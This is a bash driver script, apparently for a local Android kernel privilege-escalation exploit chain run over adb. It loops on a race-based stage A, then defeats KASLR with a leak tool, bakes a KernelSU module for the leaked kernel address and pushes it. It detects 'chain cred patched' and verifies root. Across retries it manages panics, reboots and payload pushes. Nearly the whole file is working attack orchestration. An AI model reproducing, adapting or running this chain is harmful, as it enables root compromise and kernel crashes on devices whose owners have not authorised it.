#!/bin/bash
set -u

REPO_ROOT=$(CDPATH= cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)
cd "$REPO_ROOT"

ADB=${ADB:-adb}
S=${S:-${ANDROID_SERIAL:-}}
if [ -n "$S" ]; then ADB="$ADB -s $S"; fi
export ADB   # 供 fireA 生成的命令文件(${ADB})在子 shell 中展开
DL=/data/local/tmp
TAG=${1:-r830}
MAX_CYCLES=${2:-3}

UPTIME_FIRE_MAX=320
UPTIME_REBOOT_AT=660
LOAD_MAX_LATE=16
LOAD_MAX_EARLY=26
LOAD_EARLY_UNTIL=120
B_RETRIES=2
B_VERDICT_TIMEOUT=${B_VERDICT_TIMEOUT:-600}
# 默认允许（可设 ALLOW_REBOOT=0 禁止脚本重启，只观察）。
ALLOW_REBOOT=${ALLOW_REBOOT:-1}
GATE_MAX_TRIES=2
A_SLOT_LIST="1 2"

DRV=${TAG}_driver.log
: > "$DRV"
log(){ echo "[$(date '+%H:%M:%S')] $*" | tee -a "$DRV"; }
die(){ log "FATAL: $*"; exit 1; }

UP=; L1=; ENF=; BID=
read_state(){
  local R
  R=$(timeout 15 $ADB shell 'cat /proc/uptime; cat /proc/loadavg; getenforce; cat /proc/sys/kernel/random/boot_id' 2>/dev/null | tr -d '\r')
  [ -z "$R" ] && return 1
  UP=$(printf '%s\n' "$R" | sed -n 1p | awk '{print $1}')
  L1=$(printf '%s\n' "$R" | sed -n 2p | awk '{print $1}')
  ENF=$(printf '%s\n' "$R" | sed -n 3p)
  BID=$(printf '%s\n' "$R" | sed -n 4p)
  [ -n "$UP" ] && [ -n "$BID" ] || return 1
  return 0
}
online(){ [ "$(timeout 8 $ADB get-state 2>/dev/null | tr -d '\r')" = "device" ]; }
wait_device(){
  local i
  for i in $(seq 1 90); do
    if online; then
      sleep 3
      if read_state; then
        if [ -z "${1:-}" ] || [ "$BID" != "$1" ]; then
          RAMOOPS_DONE=0
          capture_ramoops "$(date +%H%M%S)"
          return 0
        fi
      fi
    fi
    sleep 2
  done
  return 1
}
panic_check(){
  PANIC=0
  [ -s "$1" ] || return 0
  if python3 -c "
import sys
d=open('$1',errors='replace').read()
sys.exit(0 if ('Internal error' in d or 'Kernel panic' in d or 'Unable to handle kernel' in d) else 1)"; then
    PANIC=1
    log "  !! PANIC signature in $1 -- capturing ramoops"
    if online; then
      timeout 60 $ADB exec-out 'cat /sys/fs/pstore/console-ramoops-0' > ${TAG}_panic_ramoops.txt 2>/dev/null
      log "  ramoops: $(wc -c < ${TAG}_panic_ramoops.txt) bytes -> ${TAG}_panic_ramoops.txt"
    else
      log "  device offline (panic rebooting)"
    fi
  fi
}
boot_reason(){
  timeout 15 $ADB shell 'getprop persist.sys.boot.reason.history' 2>/dev/null | tr -d '\r' | tr '\n' ' '
}
capture_ramoops(){
  [ "${RAMOOPS_DONE:-0}" = "1" ] && return 0
  local dst=${TAG}_ramoops${1:+_$1}.txt
  timeout 60 $ADB exec-out 'cat /sys/fs/pstore/console-ramoops-0' > "$dst" 2>/dev/null
  local n=$(wc -c < "$dst" 2>/dev/null || echo 0)
  if [ "$n" -gt 1000 ]; then
    log "  ramoops captured $n bytes -> $dst (md5 $(md5sum "$dst" | cut -c1-8))"
    log "  ramoops head: $(head -c 300 "$dst" | tr '\n' ' ')"
    RAMOOPS_DONE=1
  else
    log "  ramoops empty/absent ($n bytes)"
    rm -f "$dst"
  fi
}

gate(){
  read_state || return 1
  log "STATE uptime=${UP}s load1=${L1} enforce=${ENF} boot_id=${BID:0:8}"
  log "  boot_reason_history: $(boot_reason)"
  local lm=$LOAD_MAX_LATE
  [ "${UP%.*}" -lt "$LOAD_EARLY_UNTIL" ] 2>/dev/null && lm=$LOAD_MAX_EARLY
  python3 - "$UP" "$L1" "$ENF" "$UPTIME_FIRE_MAX" "$UPTIME_REBOOT_AT" "$lm" <<'PY'
import sys
up=float(sys.argv[1]); l1=float(sys.argv[2]); enf=sys.argv[3]
fire_max=float(sys.argv[4]); reboot_at=float(sys.argv[5]); lmax=float(sys.argv[6])
assert 0<up<100000, "uptime insane"
assert 0<=l1<2000, "loadavg insane"
if enf != "Enforcing":
    print(f"  GATE-REBOOT enforce={enf} (!=Enforcing; reboot is the only reset)"); sys.exit(2)
if up > reboot_at:
    print(f"  GATE-REBOOT uptime={up:.0f}s > {reboot_at:.0f}s  [P3] band dead -> reboot"); sys.exit(2)
if l1 > lmax:
    print(f"  GATE-WAIT load1={l1} > {lmax} (uptime {up:.0f}s) -- transient; bounded retry"); sys.exit(1)
if up > fire_max:
    print(f"  GATE-PASS uptime={up:.0f}s > {fire_max:.0f}s (window nearly shut) load1={l1}")
else:
    print(f"  GATE-PASS uptime={up:.0f}s load1={l1} limit={lmax}")
sys.exit(0)
PY
}
gate_rc=0
run_gate(){ gate; gate_rc=$?; }

fireA(){
  local slot=$1
  local AL=${TAG}a${CYCLE}s${slot}_full.log
  sed -e "s/SLIDE_LOCK_SLOT=[0-9]*/SLIDE_LOCK_SLOT=$slot/" \
      -e "s/tee r[0-9a-z]*a_full\.log/tee $AL/" \
      scripts/r821a_command.txt > ${TAG}a${CYCLE}s${slot}_command.txt
  log "A fire slot=$slot (cmd md5 $(md5sum ${TAG}a${CYCLE}s${slot}_command.txt | cut -c1-8))"
  local t0=$(date +%s)
  bash ${TAG}a${CYCLE}s${slot}_command.txt 2>&1 | tee $AL > /dev/null
  local dur=$(( $(date +%s) - t0 ))
  A_VERDICT=$(python3 - "$AL" <<'PY'
import sys
d=open(sys.argv[1],errors='replace').read()
win='one-walk WIN' in d; miss='one-walk MISS' in d
panic=('Internal error' in d) or ('Kernel panic' in d) or ('Unable to handle kernel' in d)
reached_kill='slide consumer tgkill' in d
if win and not miss: print("WIN")
elif panic: print("PANIC")
elif miss: print("MISS")
elif reached_kill: print("TRUNC")
else: print("UNKNOWN")
PY
)
  case $A_VERDICT in TRUNC|UNKNOWN)
     sleep 6; read_state
     if [ "${BID:-X}" != "${OLDBID:-Y}" ] || ! online; then
       A_VERDICT=PANIC; log "  log truncated at kill edge + boot_id changed/offline -> PANIC"
     elif [ "$dur" -lt 40 ]; then
       A_VERDICT=PANIC; log "  log truncated + exited in ${dur}s (far too early for a walk) -> PANIC"
     else
       log "  no verdict but device alive after ${dur}s -> treating as MISS"
       A_VERDICT=MISS
     fi;;
  esac
  log "A verdict slot=$slot => $A_VERDICT (dur=${dur}s, $(wc -l < $AL) lines)"
}

tail_psl2(){
  log "psl2 win1"
  timeout 40 $ADB shell "cd $DL && ./psl2 2500000 25 2>&1" | tee psl2_${TAG}a_w1.txt
  TEXT1=$(sed -n 's/.*TEXT=\(0x[0-9a-f]*\).*/\1/p' psl2_${TAG}a_w1.txt | tail -1)
  SL1=$(sed -n 's/^SLIDE=\([0-9]*\)$/\1/p' psl2_${TAG}a_w1.txt | tail -1)
  [ -n "$TEXT1" ] || { log "ABORT: no TEXT win1"; return 5; }
  log "psl2 win2"
  timeout 40 $ADB shell "cd $DL && ./psl2 2000000 25 2>&1" | tee psl2_${TAG}a_w2.txt
  TEXT2=$(sed -n 's/.*TEXT=\(0x[0-9a-f]*\).*/\1/p' psl2_${TAG}a_w2.txt | tail -1)
  SL2=$(sed -n 's/^SLIDE=\([0-9]*\)$/\1/p' psl2_${TAG}a_w2.txt | tail -1)

  python3 - "$TEXT1" "$TEXT2" "$SL1" "$SL2" <<'PY' || return 6
import sys
t1=int(sys.argv[1],16); t2=int(sys.argv[2],16); s1=int(sys.argv[3]); s2=int(sys.argv[4])
MB2=2*1024*1024; KB=0xffffffc008000000
assert t1==t2, f"TEXT mismatch {hex(t1)} {hex(t2)}"
assert s1==s2, f"SLIDE field mismatch {s1} {s2}"
assert t1%MB2==0, "TEXT not 2MB aligned"
assert 0xffff000000000000<=t1<=0xffffffffffffffff, "TEXT outside arm64 kernel VA"
assert t1-KB==s1, f"cross-check: TEXT-BASE={hex(t1-KB)} vs SLIDE={s1}"
assert 0<s1<0x8000000000, "slide outside 512GB KASLR"
print(f"  asserts OK TEXT={hex(t1)} SLIDE={s1} ({s1//MB2}x2MB)")
PY
  log "bake kernelko for TEXT=$TEXT1"
  (cd ksu && OUT=kernelsu-${TAG}b.ko ./make_device_ko.sh "$TEXT1" >/dev/null 2>&1) || return 7
  log "  ko $(md5sum ksu/kernelsu-${TAG}b.ko | cut -c1-8)"
  $ADB push ksu/kernelsu-${TAG}b.ko $DL/kernelsu-device-ready.ko >/dev/null 2>&1 || return 8
  timeout 25 $ADB shell "sync; md5sum $DL/kernelsu-device-ready.ko" 2>&1 | tr -d '\r'
  return 0
}

genB(){
  python3 - "$TEXT1" "$1" "$TAG" "$2" "$ADB" <<'PY' || return 9
import sys, re
t, slot, tag, tryn, adb = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5]
d = open('scripts/r776b_command.txt', errors='replace').read()
d = d.replace('SLIDE_TEXT_ADDR=0xffffffd8f0c00000', 'SLIDE_TEXT_ADDR='+t)
d = re.sub(r'SLIDE_LOCK_SLOT=\d+', 'SLIDE_LOCK_SLOT='+slot, d)
d = d.replace('SLIDE_V155_RESAMPLE=12', 'SLIDE_V155_RESAMPLE=16')
d = d.replace('tee r776b_full.log', f'tee {tag}b_t{tryn}_full.log')
d = d.replace('| tee r776b_full.log', f'| tee {tag}b_t{tryn}_full.log')
d = d.replace('timeout 300 ${ADB} shell', 'timeout 600 ' + adb + ' shell')
open(f'{tag}b_t{tryn}_command.txt','w').write(d)
for k in ['SLIDE_TEXT_ADDR','SLIDE_LOCK_SLOT','SLIDE_V155_RESAMPLE']:
    m = re.search(k+r'=\S+', d); print('  ', m.group(0) if m else f'{k} MISSING')
assert 'SLIDE_V155_RESAMPLE=16' in d and t in d and f'SLIDE_LOCK_SLOT={slot}' in d
assert f'b_t{tryn}_full.log' in d, "per-try log substitution failed"
PY
  return 0
}
fireB(){
  local slot=$1 tryn=$2
  genB "$slot" "$tryn" || return 9
  BL=${TAG}b_t${tryn}_full.log
  log "B fire slot=$slot try=$tryn (cmd md5 $(md5sum ${TAG}b_t${tryn}_command.txt | cut -c1-8))"
  nohup bash ${TAG}b_t${tryn}_command.txt > $BL 2>&1 &
  local fpid=$!
  local waited=0
  while [ $waited -lt $B_VERDICT_TIMEOUT ]; do
    sleep 5; waited=$((waited+5))
    if [ -s "$BL" ]; then
      if python3 -c "
import sys
d=open('$BL',errors='replace').read()
sys.exit(0 if ('chain cred patched' in d or 'L-pre-gate exhausted' in d or 'v114 probe miss' in d or 'abandon arm -> clean park' in d or 'Internal error' in d or 'Kernel panic' in d or 'Unable to handle' in d) else 1)"; then
        break
      fi
    fi
    if ! online && [ $waited -ge 20 ]; then break; fi
  done
  log "  B verdict poll after ${waited}s -> $(wc -l < $BL) log lines"
  B_VERDICT=$(python3 - "$BL" <<'PY'
import sys
d=open(sys.argv[1],errors='replace').read()
if 'chain cred patched' in d: print("ROOT")
elif 'L-pre-gate exhausted' in d: print("REJECT")
# slide.c:2106 的 pr_warning 用 "%s" 拼接(probe_only ? "probe-only" : "miss"),
# 所以源码里 grep 不到字面量, 但运行时确实输出 "v114 probe miss -> park"。
elif 'v114 probe miss' in d: print("MISS")
elif 'abandon arm -> clean park' in d: print("ARM-ABANDON")
elif ('Internal error' in d) or ('Kernel panic' in d) or ('Unable to handle' in d): print("PANIC")
elif 'L-pre-gate PASS' in d: print("PASS")
else: print("NONE")
PY
)
  log "B verdict slot=$slot => $B_VERDICT"
}
verify_root(){
  R=$(timeout 25 $ADB shell "$DL/su -c 'id; getenforce'" 2>&1 | tr -d '\r')
  log "ROOT-VERIFY: $(printf '%s' "$R" | tr '\n' ' ')"
  case "$R" in *"uid=0(root)"*) return 0;; *) return 1;; esac
}
band_probe(){
  if [ ! -x "$DL/r829_bandscan" ]; then log "  bandscan not on device"; return 1; fi
  timeout 60 $ADB shell "$DL/su -c '$DL/r829_bandscan 1024'" 2>&1 | tr -d '\r' | tee ${TAG}_band_post.txt | sed -n '1,3p;14,18p'
}

REBOOTS=0
MAX_REBOOTS=${MAX_REBOOTS:-3}

wait_new_boot(){
  local i
  for i in $(seq 1 90); do
    if online; then
      sleep 3
      if read_state && [ "$BID" != "$OLDBID" ]; then
        RAMOOPS_DONE=0
        capture_ramoops "$(date +%H%M%S)"
        log "  new boot_id=${BID:0:8} uptime=${UP}s enforce=${ENF}"
        return 0
      fi
    fi
    sleep 2
  done
  return 1
}
reboot_once(){
  [ "$ALLOW_REBOOT" = "1" ] || { log "  reboot disallowed (ALLOW_REBOOT=0)"; return 1; }
  if [ "$REBOOTS" -ge "$MAX_REBOOTS" ]; then
    log "  reboot budget exhausted ($REBOOTS/$MAX_REBOOTS) -> STOP (no spin)"; return 1
  fi
  REBOOTS=$((REBOOTS+1))
  if ! online; then
    log "  device offline (panic-induced reboot in flight) -> waiting for the new boot"
    wait_new_boot && return 0
    return 1
  fi
  local pr
  pr=$(timeout 12 $ADB shell 'setprop debug.omp.probe 1; getprop debug.omp.probe' 2>/dev/null | tr -d '\r')
  [ "$pr" = "1" ] || { log "  property service dead (probe=$pr) -> cannot self-reboot"; return 1; }
  log "  self-reboot $REBOOTS/$MAX_REBOOTS (boot_id ${BID:0:8})"
  timeout 20 $ADB shell sync 2>/dev/null
  RAMOOPS_DONE=0
  OLDBID=$BID
  timeout 40 $ADB reboot >/dev/null 2>&1
  wait_new_boot
}

log "================ $TAG autofire start (max_cycles=$MAX_CYCLES) ================"
log "gate: FIRE<=${UPTIME_FIRE_MAX}s REBOOT_AT=${UPTIME_REBOOT_AT}s LOAD<=${LOAD_MAX_LATE} (uptime<${LOAD_EARLY_UNTIL}s: <=${LOAD_MAX_EARLY}) | reboots<=${MAX_REBOOTS} | B retries=$B_RETRIES"

PRELOAD=${PRELOAD:-payloads/preload.so}
PSL2=${PSL2:-tools/psl2}
PAYLOADS="preload.so:$PRELOAD psl2:$PSL2"

KALLSYMS=${KALLSYMS:-$REPO_ROOT/tools/kallsyms.new}
export KALLSYMS

for f in scripts/r821a_command.txt scripts/r776b_command.txt \
         ksu/make_device_ko.sh ksu/make_device_ko.py; do
  [ -e "$f" ] || die "missing host input $f"
done
[ -e "$KALLSYMS" ] || die "missing kallsyms: $KALLSYMS (set KALLSYMS=/path/to/kallsyms.new)"

# tools/ 的二进制不入库，需先 `make -C tools` 构建。放在 push 之前检查，
# 否则会先卡在 payload push 上，看不到真正缺什么。
[ -e "$PSL2" ] || die "missing $PSL2 —— 先跑 'make -C tools' 构建 tools/ 下的二进制"
for spec in $PAYLOADS; do
  n=${spec%%:*}; src=${spec#*:}
  [ -e "$src" ] || die "missing host payload $src"
  if ! timeout 15 $ADB shell "[ -e $DL/$n ]" 2>/dev/null; then
    log "  device missing $DL/$n -> pushing from $src"
    timeout 120 $ADB push "$src" "$DL/$n" >/dev/null 2>&1 || die "push $n failed"
  else
    log "  device has $DL/$n (md5 $(timeout 20 $ADB shell md5sum $DL/$n 2>/dev/null | tr -d '\r' | cut -c1-8))"
  fi
done

# 有本地件就随其它 payload 一起推；没有则跳过，band_probe 会静默返回。
if [ -x tools/r829_bandscan ]; then
  timeout 120 $ADB push tools/r829_bandscan "$DL/r829_bandscan" >/dev/null 2>&1 \
    && log "  staged optional r829_bandscan" \
    || log "  WARNING: r829_bandscan push failed, band probe disabled"
else
  log "  no tools/r829_bandscan (optional, band probe disabled)"
fi

timeout 25 $ADB shell sync 2>/dev/null
log "payload preflight OK"

online || log "device offline at start"
read_state && log "PRE uptime=${UP}s enforce=${ENF} boot_id=${BID:0:8}"
OLDBID=${BID:-none}

CYCLE=0
WIN=0
GATE_TRIES=0
RAMOOPS_DONE=0

while [ $CYCLE -lt $MAX_CYCLES ]; do
  CYCLE=$((CYCLE+1))
  log "----------------------- CYCLE $CYCLE/$MAX_CYCLES (reboots $REBOOTS/$MAX_REBOOTS) -----------------------"

  online || { log "device offline -> waiting for it to come back"; wait_new_boot || die "device never returned"; }
  read_state || die "cannot read state"
  [ -n "${OLDBID:-}" ] || OLDBID=$BID

  GT=0
  while :; do
    run_gate
    [ "$gate_rc" -eq 0 ] && break
    [ "$gate_rc" -eq 1 ] || break
    GT=$((GT+1))
    [ "$GT" -le "$GATE_MAX_TRIES" ] || { log "  load never settled after $GATE_MAX_TRIES checks"; break; }
    log "  gate load transient -> bounded retry $GT/$GATE_MAX_TRIES"
    sleep 12
  done
  if [ "$gate_rc" -eq 2 ]; then
    reboot_once || { log "gate unsatisfiable and cannot reboot -> STOP"; break; }
    CYCLE=$((CYCLE-1))
    continue
  fi
  if [ "$gate_rc" -eq 1 ]; then
    log "  GATE-ADVISORY load1=${L1} still > cap after $GATE_MAX_TRIES retries -> firing anyway"
    log "  (loadavg is a startup-storm indicator, not a B predictor; r832 rooted at load1=17.00)"
  fi

  A_WIN=0; A_SLOT=0; A_DEAD=0
  for SLOT in $A_SLOT_LIST; do
    fireA "$SLOT"
    A_SLOT=$SLOT
    case $A_VERDICT in
      WIN) A_WIN=1; break;;
      PANIC) log "  [P-rule] A kill-race family panic -- a known ~20% failure mode of A, not a script bug"
             log "  boot_reason: $(boot_reason)"
             capture_ramoops "$(date +%H%M%S)"
             A_DEAD=1; break;;
      *) log "  A MISS -> fresh-slot resample (same slot forbidden)";;
    esac
  done
  if [ "$A_DEAD" = "1" ]; then
    if [ "$REBOOTS" -ge "$MAX_REBOOTS" ]; then
      log "  reboot budget exhausted ($REBOOTS/$MAX_REBOOTS) -> STOP (no spin)"; break
    fi
    REBOOTS=$((REBOOTS+1))
    log "  device self-rebooted from the panic -> new boot ${REBOOTS}/${MAX_REBOOTS}"
    wait_new_boot || { log "  did not come back -> STOP"; break; }
    read_state; OLDBID=$BID
    CYCLE=$((CYCLE-1))
    continue
  fi
  if [ "$A_WIN" != "1" ]; then
    log "A phase: no WIN on any fresh slot this boot"
    reboot_once || { log "  cannot get a fresh boot -> STOP"; break; }
    CYCLE=$((CYCLE-1))
    continue
  fi

  read_state && log "A WIN slot=$A_SLOT at uptime=${UP}s load1=${L1}"
  timeout 15 $ADB shell getenforce 2>&1 | tr -d '\r'

  B_SLOT=$((A_SLOT+1))
  if [ "$B_SLOT" -gt 3 ]; then
    log "no fresh slot left for B (A consumed $A_SLOT) -> next boot"
    reboot_once || { log "  cannot get a fresh boot -> STOP"; break; }
    CYCLE=$((CYCLE-1))
    continue
  fi
  log "B will use fresh slot=$B_SLOT"

  if ! tail_psl2; then
    log "tail failed rc=$? -> treat as lost window, next boot"
    reboot_once || { log "  cannot get a fresh boot -> STOP"; break; }
    CYCLE=$((CYCLE-1))
    continue
  fi

  TRIES=0
  B_PANIC=0
  B_DIRTY=0
  B_DEAD=0
  while [ $TRIES -le $B_RETRIES ]; do
    TRIES=$((TRIES+1))
    read_state && log "  pre-B uptime=${UP}s load1=${L1}"
    fireB "$B_SLOT" "$TRIES"
    panic_check "$BL"
    if [ "$PANIC" = "1" ]; then
      log "  B panic -> device self-reboots"
      B_PANIC=1
      if [ "$REBOOTS" -ge "$MAX_REBOOTS" ]; then
        log "  reboot budget exhausted ($REBOOTS/$MAX_REBOOTS) -> STOP (no spin)"
      else
        REBOOTS=$((REBOOTS+1))
        log "  panic-induced new boot ${REBOOTS}/${MAX_REBOOTS}; waiting"
        wait_new_boot || log "  did not come back"
        read_state; OLDBID=$BID
      fi
      break
    fi
    if [ "$B_VERDICT" = "NONE" ] && [ "$(wc -l < "$BL")" -le 2 ]; then
      B_DEAD=1
      log "  B log is $(wc -l < "$BL") line(s) with no verdict -> device died mid-fire"
      break
    fi
    case $B_VERDICT in
      ROOT|CHAIN)
        if verify_root; then
          WIN=1; log "*** B WIN: root achieved (A slot=$A_SLOT, B slot=$B_SLOT, try=$TRIES) ***"
        else
          log "  chain markers present but 'su -c id' failed -> not claiming WIN"
        fi
        break;;
      PASS)
            B_DIRTY=1
            if ! online; then
              log "  PASS + device gone => PANIC #78 arm-stage crash (rb_insert_color graft)"
              B_PANIC=1; RAMOOPS_DONE=0
              panic_check "$BL"
            else
              log "  PASS = walk armed, slot $B_SLOT DIRTY -> refire forbidden, need a new boot"
            fi
            break;;
      REJECT) log "  L-gate rejected all draws (walk never fired, slot unconsumed) -> same-slot resample";;
      MISS) log "  walk MISS (slot unconsumed) -> same-slot resample";;
      *) log "  unexpected B outcome ($B_VERDICT) -> same-slot resample";;
    esac
    sleep 3
  done

  if [ "$WIN" != "1" ] && { [ "$B_DIRTY" = "1" ] || [ "$B_DEAD" = "1" ] || [ "$B_PANIC" = "1" ]; }; then
    if [ "$B_PANIC" = "1" ]; then
      CYCLE=$((CYCLE-1))
      [ "$REBOOTS" -ge "$MAX_REBOOTS" ] && { log "  reboot budget exhausted -> STOP"; break; }
      continue
    fi
    log "  boot is spent (dirty slot / device death) -> fresh boot needed"
    reboot_once || { log "cannot reach a fresh boot -> STOP"; break; }
    CYCLE=$((CYCLE-1))
    continue
  fi

  if [ "$WIN" = "1" ]; then
    read_state && log "WIN state: uptime=${UP}s enforce=${ENF} uname=$(timeout 15 $ADB shell uname -r 2>/dev/null | tr -d '\r')"
    log "band state AFTER A+B (closes the [P1] model loop, root available now):"
    band_probe
    break
  fi

  if [ $CYCLE -lt $MAX_CYCLES ]; then
    reboot_once || { log "cannot reach a fresh boot -> STOP"; break; }
  fi
done

log "================ $TAG autofire done: WIN=$WIN cycles=$CYCLE reboots=$REBOOTS ================"
read_state && log "FINAL uptime=${UP}s enforce=${ENF} boot_id=${BID:0:8}"
exit $((1-WIN))
